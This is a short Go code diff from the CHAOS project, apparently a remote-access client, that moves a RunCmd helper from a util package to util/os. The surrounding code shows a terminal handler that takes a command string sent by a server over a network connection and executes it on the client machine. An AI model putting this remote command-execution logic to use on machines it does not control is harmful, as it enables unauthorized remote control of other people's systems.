@@ -5,8 +5,8 @@ import (
 	log "github.com/sirupsen/logrus"
 	"github.com/tiagorlampert/CHAOS/client/app/models"
 	"github.com/tiagorlampert/CHAOS/client/app/usecase"
-	"github.com/tiagorlampert/CHAOS/client/app/util"
 	"github.com/tiagorlampert/CHAOS/client/app/util/network"
+	"github.com/tiagorlampert/CHAOS/client/app/util/os"
 	"net"
 )
 
@@ -23,7 +23,7 @@ func NewTerminalUseCase(conn net.Conn) usecase.Terminal {
 func (t TerminalUseCase) Run(cmd string) {
 	fmt.Println("Command from server: " + cmd)
 
-	output, err := util.RunCmd(cmd, 10)
+	output, err := os.RunCmd(cmd, 10)
 
 	var errData models.Error
 	if err != nil {
